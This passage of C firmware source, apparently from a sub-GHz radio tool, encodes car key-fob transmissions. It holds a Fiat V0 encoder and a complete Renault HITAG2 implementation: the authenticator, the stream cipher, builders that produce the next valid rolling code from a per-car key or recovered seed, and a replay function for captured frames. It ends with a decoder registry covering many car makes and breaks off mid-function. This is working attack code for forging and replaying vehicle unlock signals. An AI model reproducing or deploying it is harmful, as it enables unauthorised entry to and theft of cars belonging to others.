            } else if(!prev_bit && curr_bit) {
                index = pp_emit(up, index, cap, true, te_long);
            } else if(prev_bit && !curr_bit) {
                index = pp_emit(up, index, cap, false, te_long);
            } else {
                index = pp_emit(up, index, cap, false, te_short);
                index = pp_emit(up, index, cap, true, te_short);
            }
            prev_bit = curr_bit;
        }

        if(prev_bit) {
            index = pp_emit(up, index, cap, false, te_short);
        }
        index = pp_emit(up, index, cap, false, te_short * 8);
    }

    return index;
}

/* firmware entry point. */
static size_t fiat_v0_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!fiat_v0_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return fiat_v0_enc_upload(data, bits, up, cap);
}

/* ============================================================================
 * Renault V1 (HITAG2)  —  ProtoPirate encoder (GPLv3)
 * ----------------------------------------------------------------------------
 * Manchester, 125us te. Preamble 250 pairs, then 3 long frames
 * (16b header + 64b key + 24b key_2) and 3 short frames (16b header + 10b key).
 * The 88-bit payload = generic.data (64) + data_2 (24). Because the mandated
 * upload signature only carries one uint64_t, the 24-bit key_2 is passed via the
 * module static renault_v1_enc_data2 (set by the builders below).
 *
 * NEXT-ROLLING-CODE requires HITAG2 crypto AND a per-car secret that is NOT
 * present in serial/btn/cnt:
 *   - path A (authenticator): needs the 6-byte HITAG2 secret key.
 *   - path B (recovered):     needs recovered==YES + the 32-bit seed.
 * All of the HITAG2 crypto IS self-contained here (ported below), so path A/B
 * DO work when the caller supplies the key or seed via the _with_key/_with_seed
 * helpers. The mandated renault_v1_enc_build()/renault_v1_enc_next() — which
 * only receive serial/btn/cnt — therefore CANNOT build and return false/0.
 * ==========================================================================*/

#define RENAULT_V1_ENC_TE_US           125U
#define RENAULT_V1_ENC_HEADER_LOW_US   1500U
#define RENAULT_V1_ENC_HEADER_HIGH_US  1000U
#define RENAULT_V1_ENC_SHORT_GAP_US    21500U
#define RENAULT_V1_ENC_PREAMBLE_PAIRS  250U
#define RENAULT_V1_ENC_LONG_FRAMES     3U
#define RENAULT_V1_ENC_SHORT_FRAMES    3U
#define RENAULT_V1_ENC_UPLOAD_CAPACITY 1295U
#define RENAULT_V1_ENC_HEADER_BITS     16U
#define RENAULT_V1_ENC_KEY_BITS        64U
#define RENAULT_V1_ENC_KEY2_BITS       24U
#define RENAULT_V1_ENC_SHORT_KEY_BITS  10U
#define RENAULT_V1_ENC_MIN_COUNT_BIT   88U

/* AM+FM both flagged (SubGhzProtocolFlag_AM | SubGhzProtocolFlag_FM). The
 * waveform is emitted as plain OOK-style level/duration pairs; primary assumed
 * AM. Verify per vehicle — some HITAG2 remotes transmit 2-FSK. */
static const bool renault_v1_enc_is_fsk = false;

/* 24-bit key_2 tail, bridged from builder to upload (see header note). */
static uint64_t renault_v1_enc_data2 = 0;

/* ---- byte helpers -------------------------------------------------------- */
static void renault_v1_enc_u64_to_bytes_be(uint64_t value, uint8_t* out, size_t nbytes) {
    for(size_t i = 0; i < nbytes; i++) {
        out[i] = (uint8_t)(value >> (8U * (nbytes - 1U - i)));
    }
}

static uint64_t renault_v1_enc_bytes_to_u64_be(const uint8_t* data, size_t nbytes) {
    uint64_t value = 0;
    for(size_t i = 0; i < nbytes; i++) {
        value = (value << 8U) | data[i];
    }
    return value;
}

static uint8_t renault_v1_enc_frame_xor(const uint8_t raw[11]) {
    uint8_t value = 0;
    for(size_t i = 0; i < 10; i++) {
        value ^= raw[i];
    }
    return value;
}

static void renault_v1_enc_apply_raw(uint8_t raw[11], uint64_t* data, uint64_t* data_2) {
    *data = renault_v1_enc_bytes_to_u64_be(raw, 8);
    *data_2 = ((uint64_t)raw[8] << 16U) | ((uint64_t)raw[9] << 8U) | raw[10];
}

/* ---- HITAG2 authenticator (path A) --------------------------------------- */
static uint8_t
    renault_v1_enc_i4(uint64_t x, uint8_t a, uint8_t b, uint8_t c, uint8_t d) {
    return (uint8_t)((((x >> a) & 1U) << 3U) | (((x >> b) & 1U) << 2U) |
                     (((x >> c) & 1U) << 1U) | ((x >> d) & 1U));
}

static uint8_t renault_v1_enc_f20(uint64_t state) {
    const uint8_t s0 = (uint8_t)((0x3C65U >> renault_v1_enc_i4(state, 2U, 3U, 5U, 6U)) & 1U);
    const uint8_t s1 = (uint8_t)((0x0EE5U >> renault_v1_enc_i4(state, 8U, 12U, 14U, 15U)) & 1U);
    const uint8_t s2 = (uint8_t)((0x0EE5U >> renault_v1_enc_i4(state, 17U, 21U, 23U, 26U)) & 1U);
    const uint8_t s3 = (uint8_t)((0x0EE5U >> renault_v1_enc_i4(state, 28U, 29U, 31U, 33U)) & 1U);
    const uint8_t s4 = (uint8_t)((0x3C65U >> renault_v1_enc_i4(state, 34U, 43U, 44U, 46U)) & 1U);
    return (uint8_t)((0x0DD3929BUL >> ((s0 << 4U) | (s1 << 3U) | (s2 << 2U) | (s3 << 1U) | s4)) &
                     1U);
}

static uint64_t renault_v1_enc_lfsr(uint64_t state) {
    const uint64_t fb =
        (state ^ (state >> 2U) ^ (state >> 3U) ^ (state >> 6U) ^ (state >> 7U) ^ (state >> 8U) ^
         (state >> 16U) ^ (state >> 22U) ^ (state >> 23U) ^ (state >> 26U) ^ (state >> 30U) ^
         (state >> 41U) ^ (state >> 42U) ^ (state >> 43U) ^ (state >> 46U) ^ (state >> 47U)) &
        1ULL;
    return (state >> 1U) | (fb << 47U);
}

static uint64_t renault_v1_enc_key_to_u64(const uint8_t key[6]) {
    uint64_t key64 = 0ULL;
    for(size_t i = 0; i < 6U; i++) {
        key64 = (key64 << 8U) | key[i];
    }
    return key64;
}

static uint32_t renault_v1_enc_authenticator(
    uint32_t uid,
    uint8_t button,
    uint32_t counter,
    const uint8_t key[6]) {
    const uint64_t key64 = renault_v1_enc_key_to_u64(key);
    const uint32_t nonce = (counter << 4U) | ((uint32_t)button & 0x0FU);
    uint64_t state = 0ULL;
    for(uint8_t i = 32U; i < 48U; i++) {
        state = (state << 1U) | ((key64 >> i) & 1ULL);
    }
    for(uint8_t i = 0U; i < 32U; i++) {
        state = (state << 1U) | ((uint64_t)((uid >> i) & 1U));
    }
    for(uint8_t i = 0U; i < 32U; i++) {
        const uint64_t nonce_bit = (uint64_t)renault_v1_enc_f20(state) ^ ((nonce >> (31U - i)) & 1U);
        state = (state >> 1U) | (((nonce_bit ^ ((key64 >> (31U - i)) & 1ULL)) & 1ULL) << 47U);
    }
    uint32_t hop = 0U;
    for(uint8_t i = 0U; i < 32U; i++) {
        hop = (hop << 1U) | renault_v1_enc_f20(state);
        state = renault_v1_enc_lfsr(state);
    }
    return hop;
}

static void renault_v1_enc_pack_auth_frame(
    uint32_t uid,
    uint8_t btn,
    uint16_t cnt10,
    uint32_t hop,
    uint8_t tail,
    uint8_t raw[11]) {
    raw[0] = (uint8_t)(uid >> 24U);
    raw[1] = (uint8_t)(uid >> 16U);
    raw[2] = (uint8_t)(uid >> 8U);
    raw[3] = (uint8_t)uid;
    raw[4] = (uint8_t)(((btn & 0x0FU) << 4U) | ((cnt10 >> 6U) & 0x0FU));
    raw[5] = (uint8_t)(((cnt10 & 0x3FU) << 2U) | ((hop >> 30U) & 3U));
    raw[6] = (uint8_t)(hop >> 22U);
    raw[7] = (uint8_t)(hop >> 14U);
    raw[8] = (uint8_t)(hop >> 6U);
    raw[9] = (uint8_t)(((hop << 2U) & 0xFCU) | (tail & 3U));
    raw[10] = renault_v1_enc_frame_xor(raw);
}

/* ---- HITAG2 stream cipher (path B, recovered seed) ----------------------- */
static uint8_t renault_v1_enc_extract_bits(uint32_t value, uint8_t lsb, uint8_t width) {
    return (uint8_t)((value >> lsb) & ((1U << width) - 1U));
}

static void renault_v1_enc_serial_permute(const uint8_t serial[4], uint8_t perm[6]) {
    const uint8_t sn0 = serial[0];
    const uint8_t sn1 = serial[1];
    const uint8_t sn2 = serial[2];
    const uint8_t sn3 = serial[3];

    uint8_t acc = (uint8_t)(((sn0 >> 6) & 2U) | ((sn1 >> 4) & 8U) |
                            renault_v1_enc_extract_bits(sn0 ^ 0x10U, 4, 1));
    acc |= (uint8_t)((~(uint32_t)(sn0 << 2)) & 0x20U);
    acc |= (uint8_t)((sn0 << 5) & 0x40U);
    acc |= (uint8_t)((sn2 << 1) & 0x80U);
    acc |= (uint8_t)((~(uint32_t)(sn2 >> 5)) & 4U);
    acc |= (uint8_t)((~(uint32_t)(sn0 >> 2)) & 0x10U);
    perm[0] = acc;

    const uint8_t sn1_inv_shr3 = (uint8_t) ~(sn1 >> 3);
    const uint8_t sn3_inv_shl3 = (uint8_t) ~(sn3 << 3);
    acc = (uint8_t)(renault_v1_enc_extract_bits(sn1, 5, 1) | (sn1_inv_shr3 & 4U) | (sn0 & 0x20U));
    acc |= (uint8_t)(sn3_inv_shl3 & 8U);
    acc |= (uint8_t)((~(uint32_t)(sn2 << 2)) & 0x10U);
    acc |= (uint8_t)((~(uint32_t)(sn2 << 3)) & 0x40U);
    acc |= 0x80U;
    perm[1] = acc;

    const uint8_t sn0_shr3 = (uint8_t)(sn0 >> 3);
    acc = (uint8_t)(renault_v1_enc_extract_bits(sn0, 2, 1) | (sn0_shr3 & 2U) |
                    ((~(uint32_t)(sn3 >> 2)) & 4U) | (sn1 & 0x10U));
    acc |= (uint8_t)((~(uint32_t)(sn1 << 4)) & 0x20U);
    acc |= (uint8_t)(sn3_inv_shl3 & 0x40U);
    acc |= 0x80U;
    perm[2] = acc;

    const uint8_t sn2_inv_shl6 = (uint8_t) ~(sn2 << 6);
    acc = (uint8_t)(((sn0 >> 2) & 2U) | ((sn1 >> 3) & 8U) |
                    renault_v1_enc_extract_bits(sn2 ^ 0x20U, 5, 1));
    acc |= (uint8_t)((sn1 << 5) & 0x20U);
    acc |= (uint8_t)((sn3 << 1) & 0x40U);
    acc |= (uint8_t)(((uint8_t)~sn0_shr3) & 4U);
    acc |= (uint8_t)(sn1_inv_shr3 & 0x10U);
    acc |= (uint8_t)(sn2_inv_shl6 & 0x80U);
    perm[3] = acc;

    uint8_t perm4_lo = (uint8_t)(((sn3 << 2) & 8U) | ((sn0 << 4) & 0x10U) |
                                 renault_v1_enc_extract_bits(sn0 ^ 4U, 2, 1));
    perm4_lo |= (uint8_t)((~(uint32_t)(sn3 >> 1)) & 2U);
    perm4_lo |= (uint8_t)((~(uint32_t)(sn1 >> 4)) & 4U);
    uint8_t perm4_hi = (uint8_t)((~(uint32_t)(sn0 << 4)) & 0x20U);
    perm4_hi |= (uint8_t)(sn2_inv_shl6 & 0x40U);
    const uint8_t sn1_inv_shl3 = (uint8_t) ~(sn1 << 3);
    perm4_hi |= (uint8_t)(sn1_inv_shl3 & 0x80U);
    perm[4] = (uint8_t)(perm4_lo | perm4_hi);

    uint8_t perm5 = (uint8_t)(((sn3 >> 2) & 0x10U) | ((sn2 >> 3) & 2U) | (((uint8_t)~sn0) & 0x80U));
    perm5 |= (uint8_t)((~(uint32_t)(sn0 << 3)) & 8U);
    perm5 |= (uint8_t)((sn0 >> 2) & 0x10U);
    perm5 |= (uint8_t)(sn1_inv_shl3 & 0x20U);
    perm5 |= (uint8_t)((sn3 >> 1) & 0x40U);
    perm5 |= (uint8_t)((~(uint32_t)(sn1 >> 1)) & 4U);
    perm[5] = perm5;
}

static uint8_t renault_v1_enc_truth(uint32_t table, uint8_t index) {
    return (uint8_t)((table >> index) & 1U);
}

static uint8_t renault_v1_enc_filter_index(uint8_t a, uint8_t b, uint8_t c, uint8_t d) {
    return (uint8_t)((a << 3U) | (b << 2U) | (c << 1U) | d);
}

static uint8_t renault_v1_enc_byte_bit(uint8_t byte, uint8_t bit) {
    return (uint8_t)((byte >> bit) & 1U);
}

static uint8_t renault_v1_enc_filter(const uint8_t state[6]) {
    uint8_t group = 0;
    group |= renault_v1_enc_truth(
        0x2C79U,
        renault_v1_enc_filter_index(
            renault_v1_enc_byte_bit(state[0], 1),
            renault_v1_enc_byte_bit(state[0], 2),
            renault_v1_enc_byte_bit(state[0], 4),
            renault_v1_enc_byte_bit(state[0], 5)));
    group |= (uint8_t)(renault_v1_enc_truth(
                           0x6671U,
                           renault_v1_enc_filter_index(
                               renault_v1_enc_byte_bit(state[1], 0),
                               renault_v1_enc_byte_bit(state[1], 1),
                               renault_v1_enc_byte_bit(state[1], 3),
                               renault_v1_enc_byte_bit(state[1], 7)))
                       << 1U);
    group |= (uint8_t)(renault_v1_enc_truth(
                           0x6671U,
                           renault_v1_enc_filter_index(
                               renault_v1_enc_byte_bit(state[3], 5),
                               renault_v1_enc_byte_bit(state[2], 0),
                               renault_v1_enc_byte_bit(state[2], 2),
                               renault_v1_enc_byte_bit(state[2], 6)))
                       << 2U);
    group |= (uint8_t)(renault_v1_enc_truth(
                           0x6671U,
                           renault_v1_enc_filter_index(
                               renault_v1_enc_byte_bit(state[4], 6),
                               renault_v1_enc_byte_bit(state[3], 0),
                               renault_v1_enc_byte_bit(state[3], 2),
                               renault_v1_enc_byte_bit(state[3], 3)))
                       << 3U);
    group |= (uint8_t)(renault_v1_enc_truth(
                           0x2C79U,
                           renault_v1_enc_filter_index(
                               renault_v1_enc_byte_bit(state[5], 1),
                               renault_v1_enc_byte_bit(state[5], 3),
                               renault_v1_enc_byte_bit(state[5], 4),
                               renault_v1_enc_byte_bit(state[4], 5)))
                       << 4U);
    return renault_v1_enc_truth(0x7907287BUL, group);
}

static uint8_t renault_v1_enc_parity8(uint8_t value) {
    value ^= (uint8_t)(value >> 4U);
    value ^= (uint8_t)(value >> 2U);
    value ^= (uint8_t)(value >> 1U);
    return (uint8_t)(value & 1U);
}

static uint8_t renault_v1_enc_feedback(const uint8_t state[6]) {
    static const uint8_t masks[6] = {0xB3U, 0x80U, 0x83U, 0x22U, 0x00U, 0x73U};
    uint8_t feedback = 0;
    for(uint8_t i = 0; i < 6; i++) {
        feedback ^= renault_v1_enc_parity8((uint8_t)(state[i] & masks[i]));
    }
    return (uint8_t)(feedback & 1U);
}

static void renault_v1_enc_shift_state(uint8_t state[6], uint8_t input) {
    for(uint8_t i = 0; i < 5; i++) {
        state[i] = (uint8_t)((state[i] << 1U) | (state[i + 1U] >> 7U));
    }
    state[5] = (uint8_t)((state[5] << 1U) | (input & 1U));
}

static void renault_v1_enc_shift_u32(uint8_t buf[4], uint8_t inject) {
    const uint8_t b0 = buf[0];
    const uint8_t b1 = buf[1];
    const uint8_t b2 = buf[2];
    const uint8_t b3 = buf[3];
    buf[3] = (uint8_t)((b2 >> 7U) | (b3 << 1U));
    buf[2] = (uint8_t)((b1 >> 7U) | (b2 << 1U));
    buf[1] = (uint8_t)((b0 >> 7U) | (b1 << 1U));
    buf[0] = (uint8_t)((b0 << 1U) | (inject & 1U));
}

static void renault_v1_enc_clock_cipher(uint8_t state[6], uint8_t iv_work[4], uint8_t iv_orig[4]) {
    for(uint8_t i = 0; i < 32; i++) {
        const uint8_t filter = renault_v1_enc_filter(state);
        uint8_t mix = (iv_work[3] & 0x80U) ? (filter ? 0U : 1U) : (filter ? 1U : 0U);
        if(iv_orig[3] & 0x80U) {
            mix ^= 5U;
        }
        renault_v1_enc_shift_state(state, (uint8_t)(mix & 1U));
        renault_v1_enc_shift_u32(iv_work, 0);
        renault_v1_enc_shift_u32(iv_orig, (uint8_t)((mix >> 2U) & 1U));
    }

    for(uint8_t i = 0; i < 32; i++) {
        renault_v1_enc_shift_u32(iv_work, 0);
        if(renault_v1_enc_filter(state)) {
            iv_work[0] |= 1U;
        }
        renault_v1_enc_shift_state(state, renault_v1_enc_feedback(state));
    }
}

static void renault_v1_enc_build_iv(uint32_t cnt, uint8_t btn, uint32_t seed, uint8_t iv[4]) {
    iv[0] = (uint8_t)(((cnt << 4U) & 0xF0U) | (btn & 0x0FU));
    iv[1] = (uint8_t)((cnt >> 4U) & 0xFFU);
    iv[2] = (uint8_t)(((seed >> 8U) & 0xF0U) | ((cnt >> 12U) & 0x0FU));
    iv[3] = (uint8_t)(seed & 0xFFU);
}

static void renault_v1_enc_encrypt_from_iv(
    const uint8_t serial_be[4],
    const uint8_t iv[4],
    uint8_t out[11]) {
    uint8_t perm[6];
    uint8_t state[6];
    uint8_t iv_work[4];
    uint8_t iv_orig[4];

    renault_v1_enc_serial_permute(serial_be, perm);
    state[0] = serial_be[0];
    state[1] = serial_be[1];
    state[2] = serial_be[2];
    state[3] = serial_be[3];
    state[4] = perm[4];
    state[5] = perm[5];
    iv_work[0] = perm[0];
    iv_work[1] = perm[1];
    iv_work[2] = perm[2];
    iv_work[3] = perm[3];
    iv_orig[0] = iv[0];
    iv_orig[1] = iv[1];
    iv_orig[2] = iv[2];
    iv_orig[3] = iv[3];
    renault_v1_enc_clock_cipher(state, iv_work, iv_orig);

    const uint8_t hop0 = iv_work[0];
    uint8_t hop1 = (uint8_t)((hop0 >> 7U) | (iv_work[1] << 1U));
    uint8_t hop2 = (uint8_t)((iv_work[1] >> 7U) | (iv_work[2] << 1U));
    const uint8_t hop_ext = (uint8_t)(((hop0 >> 6U) & 1U) | (hop1 << 1U));
    uint8_t hop3 = (uint8_t)((iv_work[2] >> 7U) | (iv_work[3] << 1U));
    uint8_t hop4 = (uint8_t)((iv_work[3] >> 7U) | (state[5] << 1U));
    hop1 = (uint8_t)((hop1 >> 7U) | (hop2 << 1U));
    hop2 = (uint8_t)((hop2 >> 7U) | (hop3 << 1U));
    hop3 = (uint8_t)((hop3 >> 7U) | (hop4 << 1U));

    uint32_t mix = ((uint32_t)iv[1] << 4U) | ((uint32_t)iv[0] >> 4U);
    mix = (mix | (((uint32_t)iv[2] << 12U) & 0xFFFFU)) & 0xFFFFU;

    out[0] = serial_be[0];
    out[1] = serial_be[1];
    out[2] = serial_be[2];
    out[3] = serial_be[3];
    out[4] = (uint8_t)(((mix >> 6U) & 0x0FU) | ((iv[0] << 4U) & 0xF0U));
    out[5] = (uint8_t)((hop3 & 3U) | ((mix << 2U) & 0xFCU));
    out[6] = hop2;
    out[7] = hop1;
    out[8] = hop_ext;
    out[9] = (uint8_t)((hop0 << 2U) | 2U);
    out[10] = renault_v1_enc_frame_xor(out);
}

static void renault_v1_enc_encrypt_frame(
    uint32_t serial,
    uint32_t cnt,
    uint8_t btn,
    uint32_t seed,
    uint8_t out[11],
    uint8_t iv[4]) {
    const uint8_t serial_be[4] = {
        (uint8_t)(serial >> 24U),
        (uint8_t)(serial >> 16U),
        (uint8_t)(serial >> 8U),
        (uint8_t)serial,
    };
    renault_v1_enc_build_iv(cnt, btn, seed, iv);
    renault_v1_enc_encrypt_from_iv(serial_be, iv, out);
}

/* ---- waveform builder (ported from renault_v1_encoder_get_upload) --------- */
static bool renault_v1_enc_add_level(
    LevelDuration* up,
    size_t* index,
    size_t cap,
    bool level,
    uint32_t duration) {
    if(*index >= cap) {
        return false;
    }
    up[(*index)++] = level_duration_make(level, duration);
    return true;
}

static bool renault_v1_enc_add_bits(
    LevelDuration* up,
    size_t* index,
    size_t cap,
    uint64_t value,
    uint8_t bit_count) {
    for(uint8_t i = bit_count; i > 0; i--) {
        const bool one = ((value >> (i - 1U)) & 1ULL) != 0;
        if(one) {
            if(!renault_v1_enc_add_level(up, index, cap, true, RENAULT_V1_ENC_TE_US)) return false;
            if(!renault_v1_enc_add_level(up, index, cap, false, RENAULT_V1_ENC_TE_US)) return false;
        } else {
            if(!renault_v1_enc_add_level(up, index, cap, false, RENAULT_V1_ENC_TE_US)) return false;
            if(!renault_v1_enc_add_level(up, index, cap, true, RENAULT_V1_ENC_TE_US)) return false;
        }
    }
    return true;
}

/* 2) waveform builder. `data` = 64-bit key; the 24-bit key_2 comes from the
 * module static renault_v1_enc_data2 set by the builders below. */
static size_t
    renault_v1_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;
    if(up == NULL) return 0;

    size_t index = 0;
    const uint64_t key = data;
    const uint64_t key_2 = renault_v1_enc_data2 & 0xFFFFFFULL;

    for(size_t i = 0; i < RENAULT_V1_ENC_PREAMBLE_PAIRS; i++) {
        if(!renault_v1_enc_add_level(up, &index, cap, true, RENAULT_V1_ENC_TE_US)) return 0;
        if(!renault_v1_enc_add_level(up, &index, cap, false, RENAULT_V1_ENC_TE_US)) return 0;
    }

    for(uint8_t frame = 0; frame < RENAULT_V1_ENC_LONG_FRAMES; frame++) {
        if(!renault_v1_enc_add_level(up, &index, cap, false, RENAULT_V1_ENC_HEADER_LOW_US)) return 0;
        if(!renault_v1_enc_add_level(up, &index, cap, true, RENAULT_V1_ENC_HEADER_HIGH_US))
            return 0;
        if(!renault_v1_enc_add_bits(up, &index, cap, 1, RENAULT_V1_ENC_HEADER_BITS)) return 0;
        if(!renault_v1_enc_add_bits(up, &index, cap, key, RENAULT_V1_ENC_KEY_BITS)) return 0;
        if(!renault_v1_enc_add_bits(up, &index, cap, key_2, RENAULT_V1_ENC_KEY2_BITS)) return 0;
    }

    const uint64_t short_key = (key >> 18U) & 0x3FFULL;
    for(uint8_t frame = 0; frame < RENAULT_V1_ENC_SHORT_FRAMES; frame++) {
        if(!renault_v1_enc_add_level(up, &index, cap, false, RENAULT_V1_ENC_HEADER_LOW_US)) return 0;
        if(!renault_v1_enc_add_level(up, &index, cap, true, RENAULT_V1_ENC_HEADER_HIGH_US))
            return 0;
        if(!renault_v1_enc_add_bits(up, &index, cap, 1, RENAULT_V1_ENC_HEADER_BITS)) return 0;
        if(!renault_v1_enc_add_bits(up, &index, cap, short_key, RENAULT_V1_ENC_SHORT_KEY_BITS))
            return 0;
        if(!renault_v1_enc_add_level(up, &index, cap, false, RENAULT_V1_ENC_SHORT_GAP_US)) return 0;
    }

    return index;
}

/* 1) mandated build: CANNOT synthesise a valid HITAG2 frame from serial/btn/cnt
 * alone — the per-car secret (6-byte key) or a recovered seed is required.
 * Returns false; use renault_v1_enc_next_with_key / _with_seed instead. */
static bool renault_v1_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    (void)serial;
    (void)btn;
    (void)cnt;
    (void)out_data;
    (void)out_bits;
    return false; /* UNRESOLVED: needs HITAG2 secret key or recovered seed. */
}

/* mandated entry point — non-functional for the same reason (returns 0). */
static size_t renault_v1_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    (void)up;
    (void)cap;
    if(!renault_v1_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return renault_v1_enc_upload(data, bits, up, cap);
}

/* ---- WORKING self-contained builders (supply the secret) ----------------- *
 * Path A — HITAG2 authenticator, needs the 6-byte secret key. `tail` is the
 * 2-bit trailer captured from the original frame (0 if unknown). Produces the
 * true next rolling code for `cnt`. */
static size_t renault_v1_enc_next_with_key(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    const uint8_t key[6],
    uint8_t tail,
    LevelDuration* up,
    size_t cap) {
    const uint16_t cnt10 = (uint16_t)(cnt & 0x3FFU);
    const uint32_t hop = renault_v1_enc_authenticator(serial, btn, cnt10, key);
    uint8_t raw[11];
    renault_v1_enc_pack_auth_frame(serial, btn, cnt10, hop, tail, raw);
    uint64_t data = 0;
    uint64_t data2 = 0;
    renault_v1_enc_apply_raw(raw, &data, &data2);
    renault_v1_enc_data2 = data2;
    return renault_v1_enc_upload(data, RENAULT_V1_ENC_MIN_COUNT_BIT, up, cap);
}

/* Path B — HITAG2 stream cipher, needs a recovered 32-bit seed. */
static size_t renault_v1_enc_next_with_seed(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint32_t seed,
    LevelDuration* up,
    size_t cap) {
    uint8_t out[11];
    uint8_t iv[4];
    renault_v1_enc_encrypt_frame(serial, cnt, btn, seed, out, iv);
    const uint64_t data = renault_v1_enc_bytes_to_u64_be(out, 8);
    renault_v1_enc_data2 = ((uint64_t)out[8] << 16U) | ((uint64_t)out[9] << 8U) | out[10];
    return renault_v1_enc_upload(data, RENAULT_V1_ENC_MIN_COUNT_BIT, up, cap);
}

/* Replay — re-emit a captured frame verbatim (data + 24-bit data_2), no counter
 * increment, no secret needed. */
static size_t renault_v1_enc_replay(
    uint64_t data,
    uint64_t data_2,
    LevelDuration* up,
    size_t cap) {
    renault_v1_enc_data2 = data_2;
    return renault_v1_enc_upload(data, RENAULT_V1_ENC_MIN_COUNT_BIT, up, cap);
}

/* ============================================================================
 * SUMMARY  (per protocol)
 * ----------------------------------------------------------------------------
 * fiat_v0
 *   entry            : fiat_v0_enc_next(serial, btn, cnt, up, cap)
 *   is_fsk           : fiat_v0_enc_is_fsk = false   (AM / OOK)
 *   max pulse count  : 1328  (FIAT_V0_ENC_UPLOAD_CAPACITY — 3 bursts of
 *                      150 preamble pairs + ~70 Manchester bits each)
 *   LIMITATION       : NO rolling-code cipher in source. The encoder re-emits
 *                      the supplied 32-bit hop verbatim. Good for REPLAY of a
 *                      captured frame or for a caller-provided hop value; it
 *                      CANNOT compute the next VALID encrypted hop from a plain
 *                      counter (Fiat's hop encryption is not reversed here).
 *
 * renault_v1 (HITAG2)
 *   entry (mandated) : renault_v1_enc_next(serial, btn, cnt, up, cap) -> 0
 *                      renault_v1_enc_build(...) -> false
 *   working entries  : renault_v1_enc_next_with_key(serial, btn, cnt, key[6],
 *                                                    tail, up, cap)
 *                      renault_v1_enc_next_with_seed(serial, btn, cnt, seed,
 *                                                    up, cap)
 *                      renault_v1_enc_replay(data, data_2, up, cap)
 *   is_fsk           : renault_v1_enc_is_fsk = false  (AM+FM both flagged;
 *                      primary assumed AM — VERIFY per vehicle, some HITAG2
 *                      remotes are 2-FSK)
 *   max pulse count  : 1295  (RENAULT_V1_ENC_UPLOAD_CAPACITY — 250 preamble
 *                      pairs + 3 long frames + 3 short frames)
 *   UNRESOLVED       : next-rolling-code needs a per-car SECRET not present in
 *                      serial/btn/cnt:
 *                        - the 6-byte HITAG2 secret key  (path A), OR
 *                        - recovered==YES + 32-bit seed  (path B).
 *                      All HITAG2 crypto (authenticator + stream cipher) IS
 *                      ported and self-contained, so path A/B produce genuine
 *                      next codes once the caller supplies the key/seed. With
 *                      neither, only REPLAY (renault_v1_enc_replay) is possible.
 *                      The 24-bit key_2 tail is bridged via the module static
 *                      renault_v1_enc_data2 (the mandated one-uint64_t upload
 *                      signature cannot carry the full 88-bit payload).
 * ==========================================================================*/

// ============================================================================
//  Registre + dispatcher
// ============================================================================
typedef void (*pp_feed_fn)(void*, bool, uint32_t);
typedef void (*pp_reset_fn)(void*);
typedef void* (*pp_alloc_fn)();
struct PpDecoderReg {
    const char* name;
    pp_alloc_fn alloc;
    pp_feed_fn  feed;
    pp_reset_fn reset;
    void*       instance;
};

static PpDecoderReg pp_registry[] = {
    { "Subaru", subaru_alloc, subaru_feed, subaru_reset, nullptr },
    { "Kia V2", kia_v2_alloc, kia_v2_feed, kia_v2_reset, nullptr },
    { "Kia V0", kia_v0_alloc, kia_v0_feed, kia_v0_reset, nullptr },
    { "Kia V1", kia_v1_alloc, kia_v1_feed, kia_v1_reset, nullptr },
    { "Kia V7", kia_v7_alloc, kia_v7_feed, kia_v7_reset, nullptr },
    { "Ford V0", ford_v0_alloc, ford_v0_feed, ford_v0_reset, nullptr },
    { "Ford V1", ford_v1_alloc, ford_v1_feed, ford_v1_reset, nullptr },
    { "Ford V2", ford_v2_alloc, ford_v2_feed, ford_v2_reset, nullptr },
    { "Ford V3", ford_v3_alloc, ford_v3_feed, ford_v3_reset, nullptr },
    { "Honda V1", honda_v1_alloc, honda_v1_feed, honda_v1_reset, nullptr },
    { "Honda V2", honda_v2_alloc, honda_v2_feed, honda_v2_reset, nullptr },
    { "Honda Static", honda_static_alloc, honda_static_feed, honda_static_reset, nullptr },
    { "Renault V0", renault_v0_alloc, renault_v0_feed, renault_v0_reset, nullptr },
    { "Renault V1", renault_v1_alloc, renault_v1_feed, renault_v1_reset, nullptr },
    { "Fiat V0", fiat_v0_alloc, fiat_v0_feed, fiat_v0_reset, nullptr },
    { "Fiat V1", fiat_v1_alloc, fiat_v1_feed, fiat_v1_reset, nullptr },
    { "Fiat V2", fiat_v2_alloc, fiat_v2_feed, fiat_v2_reset, nullptr },
    { "Chrysler V0", chrysler_v0_alloc, chrysler_v0_feed, chrysler_v0_reset, nullptr },
    { "Mazda V0", mazda_v0_alloc, mazda_v0_feed, mazda_v0_reset, nullptr },
    { "Scher-Khan", scher_khan_alloc, scher_khan_feed, scher_khan_reset, nullptr },
    { "PSA", psa_alloc, psa_feed, psa_reset, nullptr },
    { "VAG", vag_alloc, vag_feed, vag_reset, nullptr },
    { "Kia V3/V4", kia_v3v4_alloc, kia_v3v4_feed, kia_v3v4_reset, nullptr },
    { "Kia V5", kia_v5_alloc, kia_v5_feed, kia_v5_reset, nullptr },
    { "Kia V6", kia_v6_alloc, kia_v6_feed, kia_v6_reset, nullptr },
};
static const int PP_NUM_DECODERS = (int)(sizeof(pp_registry)/sizeof(pp_registry[0]));

static bool pp_inited = false;
static void pp_decoders_init() {
    if(pp_inited) return;
    for(int i = 0; i < PP_NUM_DECODERS; i++) {
        if(!pp_registry[i].instance) pp_registry[i].instance = pp_registry[i].alloc();
    }
    pp_inited = true;
}
static void pp_decoders_reset() {
    pp_decoders_init();
    for(int i = 0; i < PP_NUM_DECODERS; i++)
        if(pp_registry[i].instance) pp_registry[i].reset(pp_registry[i].instance);
    pp_found = false;
}
static bool pp_decoders_feed(bool level, int32_t dur, SubGhzDecoded& out) {
    pp_found = false;
    uint32_t d = (uint32_t)(dur < 0 ? -dur : dur);
    for(int i = 0; i < PP_NUM_DECODERS; i++)
        if(pp_registry[i].instance) pp_registry[i].feed(pp_registry[i].instance, level, d);
